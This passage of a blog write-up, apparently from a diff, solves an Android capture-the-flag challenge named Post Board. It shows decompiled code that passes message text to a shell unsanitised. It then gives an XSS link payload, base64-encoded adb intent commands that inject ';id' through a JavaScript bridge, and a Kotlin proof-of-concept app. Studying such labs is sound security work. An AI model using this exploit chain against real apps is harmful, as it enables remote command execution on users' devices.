+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cache</span>.<span style="color:#a6e22e">addMessage</span>(<span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;^(---|\\*\\*\\*|___)$&#34;</span>, RegexOption.<span style="color:#a6e22e">MULTILINE</span>).<span style="color:#a6e22e">replace</span>(html16, <span style="color:#e6db74">&#34;&lt;hr&gt;&#34;</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@JavascriptInterface</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">postCowsayMessage</span>(String cowsayMessage) {
+</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(cowsayMessage, <span style="color:#e6db74">&#34;cowsayMessage&#34;</span>);
+</span></span><span style="display:flex;"><span>    String asciiArt <span style="color:#f92672">=</span> CowsayUtil.<span style="color:#a6e22e">INSTANCE</span>.<span style="color:#a6e22e">runCowsay</span>(cowsayMessage);
+</span></span><span style="display:flex;"><span>    String html <span style="color:#f92672">=</span> StringsKt.<span style="color:#a6e22e">replace$default</span>(StringsKt.<span style="color:#a6e22e">replace$default</span>(StringsKt.<span style="color:#a6e22e">replace$default</span>(StringsKt.<span style="color:#a6e22e">replace$default</span>(StringsKt.<span style="color:#a6e22e">replace$default</span>(asciiArt, <span style="color:#e6db74">&#34;&amp;&#34;</span>, <span style="color:#e6db74">&#34;&amp;amp;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;lt;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;\&#34;&#34;</span>, <span style="color:#e6db74">&#34;&amp;quot;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;&amp;#039;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cache</span>.<span style="color:#a6e22e">addMessage</span>(<span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">+</span> StringsKt.<span style="color:#a6e22e">replace$default</span>(html, <span style="color:#e6db74">&#34;\n&#34;</span>, <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at both the JavaScript function, the <code>postMarkdownMessage</code> function has a set of rules where it only allows specific HTML tag to be rendered in the WebView. The HTML that might be useful is <code>&lt;img&gt;</code> and <code>&lt;a&gt;</code> as this 2 could potentially trigger XSS. Moving on to <code>postCowsayMessage</code>, it will run <code>CowsayUtil.INSTANCE.runCowsay</code> function.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-31">31</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> String <span style="color:#a6e22e">runCowsay</span>(String message) {
+</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(message, <span style="color:#e6db74">&#34;message&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, CowsayUtil.<span style="color:#a6e22e">scriptPath</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> message};
+</span></span><span style="display:flex;"><span>        Process process <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(command);
+</span></span><span style="display:flex;"><span>        StringBuilder output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
+</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>        Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(inputStream, <span style="color:#e6db74">&#34;getInputStream(...)&#34;</span>);
+</span></span><span style="display:flex;"><span>        Reader inputStreamReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InputStreamReader(inputStream, Charsets.<span style="color:#a6e22e">UTF_8</span>);
+</span></span><span style="display:flex;"><span>        BufferedReader bufferedReader <span style="color:#f92672">=</span> inputStreamReader <span style="color:#66d9ef">instanceof</span> BufferedReader <span style="color:#f92672">?</span> (BufferedReader) inputStreamReader : <span style="color:#66d9ef">new</span> BufferedReader(inputStreamReader, 8192);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            BufferedReader reader <span style="color:#f92672">=</span> bufferedReader;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>                String it <span style="color:#f92672">=</span> reader.<span style="color:#a6e22e">readLine</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (it <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                    Unit unit <span style="color:#f92672">=</span> Unit.<span style="color:#a6e22e">INSTANCE</span>;
+</span></span><span style="display:flex;"><span>                    Closeable.<span style="color:#a6e22e">closeFinally</span>(bufferedReader, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>                    process.<span style="color:#a6e22e">waitFor</span>();
+</span></span><span style="display:flex;"><span>                    String sb <span style="color:#f92672">=</span> output.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>                    Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(sb, <span style="color:#e6db74">&#34;toString(...)&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> sb;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                output.<span style="color:#a6e22e">append</span>(it).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;cowsay: &#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking into the <code>runCowsay</code> function, it basically interacting with shell command which I could inject my command easily since it is not sanitized. Now that I have some basic understanding, I tried to perform dynamic analysis to check if its correct.</p>
+<h3 id="dynamic-analysis">Dynamic Analysis<a hidden class="anchor" aria-hidden="true" href="#dynamic-analysis">#</a></h3>
+<p>Based on my previous information, I will need to provide a URI <code>postboard://postmessage</code> and following with the message. The message will need to be base64 encoded. I started off by create a simple xss payload <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;yeeehar&lt;/a&gt;</code> and inject to the application.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-2">2</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell am start -a android.intent.action.VIEW -d <span style="color:#e6db74">&#39;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI-eWVlZWhhcjwvYT4&#39;</span>
+</span></span><span style="display:flex;"><span>Starting: Intent <span style="color:#f92672">{</span> act<span style="color:#f92672">=</span>android.intent.action.VIEW dat<span style="color:#f92672">=</span>postboard://postmessage/... <span style="color:#f92672">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="alt text" loading="lazy" src="/posts/mhl-post-board/img/index.png#center"></p>
+<p>This method allows me to perform XSS but it will need me to click the hyperlink. I continue by crafting the payload to trigger the vulnerable function, <code>&lt;a href=&quot;javascript:WebAppInterface.postCowsayMessage('hi;id');location.reload();&quot;&gt;yeehar&lt;/a&gt;</code></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-2">2</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell am start -a android.intent.action.VIEW -d <span style="color:#e6db74">&#39;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-&#39;</span>
+</span></span><span style="display:flex;"><span>Starting: Intent <span style="color:#f92672">{</span> act<span style="color:#f92672">=</span>android.intent.action.VIEW dat<span style="color:#f92672">=</span>postboard://postmessage/... <span style="color:#f92672">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="alt text" loading="lazy" src="/posts/mhl-post-board/img/index-1.png#center"></p>
+<p>I managed to perform RCE by triggering the function and perform simple command injection. I then proceed to write a simple POC app to perform the attack in Kotlin. Do note that it is also possible to use <code>img</code> tag and it could trigger the function without performing any click.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-2">2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-3">3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-4">4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-5">5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-6">6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-7">7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-8">8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-9">9</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-kotlin" data-lang="kotlin"><span style="display:flex;"><span><span style="color:#66d9ef">val</span> intent = Intent().apply {
+</span></span><span style="display:flex;"><span>    setClassName(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;com.mobilehackinglab.postboard&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;com.mobilehackinglab.postboard.MainActivity&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">data</span> = <span style="color:#a6e22e">Uri</span>.parse(<span style="color:#e6db74">&#34;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-&#34;</span>)
+</span></span><span style="display:flex;"><span>    action = <span style="color:#a6e22e">Intent</span>.ACTION_VIEW
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>startActivity(intent)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="things-i-learned-from-this-challenge">Things I learned from this challenge<a hidden class="anchor" aria-hidden="true" href="#things-i-learned-from-this-challenge">#</a></h2>
+<ul>
+<li>Source code review to find potential RCE and XSS</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://callmeks.github.io/tags/mhl/">MHL</a></li>
+      <li><a href="https://callmeks.github.io/tags/android-ctf/">Android CTF</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://callmeks.github.io/posts/my-journey-of-cybersec/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>My Journey of Cybersec</span>
+  </a>
+  <a class="next" href="https://callmeks.github.io/posts/mhl-food-store/">
+    <span class="title">Next »</span>
+    <br>
+    <span>MHL Food Store</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://callmeks.github.io/">KS Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
+<script>
+    kofiWidgetOverlay.draw('imkstho', {
+        'type': 'floating-chat',
+        'floating-chat.donateButton.text': 'Feed Mee',
+        'floating-chat.donateButton.background-color': '#FF5E5B',
+        'floating-chat.donatebutton.image': 'https://media.giphy.com/media/kgKFcQk6oa1WIdHNSl/giphy.gif',
+        'floating-chat.donateButton.text-color': '#ffffff'
+    });
+</script>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#000000',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
